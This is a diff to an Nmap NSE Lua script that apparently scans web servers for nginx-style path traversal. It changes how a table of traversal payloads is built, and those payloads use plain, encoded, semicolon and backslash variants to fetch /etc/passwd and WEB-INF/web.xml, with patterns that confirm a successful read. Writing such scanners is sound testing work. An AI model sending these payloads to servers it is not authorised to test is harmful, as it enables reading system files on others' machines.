@@ -37,6 +37,8 @@ local select = select
 
 local clock = nmap.clock
 local msleep = nmap.msleep
+local new_socket = nmap.new_socket
+local resolve = nmap.resolve
 
 -- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
 local sleep = function(seconds)
@@ -90,8 +92,7 @@ action = function(host, port)
       server_version = match(server_banner, "nginx/([%d%.]+)")
     end
 
-    local function build_payloads(host)
-    local items = {
+    local payloads = {
       {path = "/static/../etc/passwd", checks = {"root:.*:0:0:", "daemon:.*:1:1:", "bin:.*:2:2:"}, label = "static traversal"},
       {path = "/assets/..%2f..%2fetc/passwd", checks = {"root:", "daemon:", "nobody:"}, label = "encoded traversal"},
       {path = "/files/..;/..;/etc/passwd", checks = {"root:", "daemon:"}, label = "semicolon traversal"},
@@ -101,11 +102,10 @@ action = function(host, port)
       {path = "/assets/..\\..\\WEB-INF\\web.xml", checks = {"web%-app"}, label = "backslash traversal"},
       {path = "/..;/..;/WEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "matrix traversal"},
     
+    
     }
-    return items
-end
 
-    for _, p in ipairs(build_payloads(host)) do
+    for _, p in ipairs(payloads) do
       local req = http.get(host, port, p.path)
       if req and req.status and req.status >= 200 and req.status < 400 then
         local body = req.body or ""
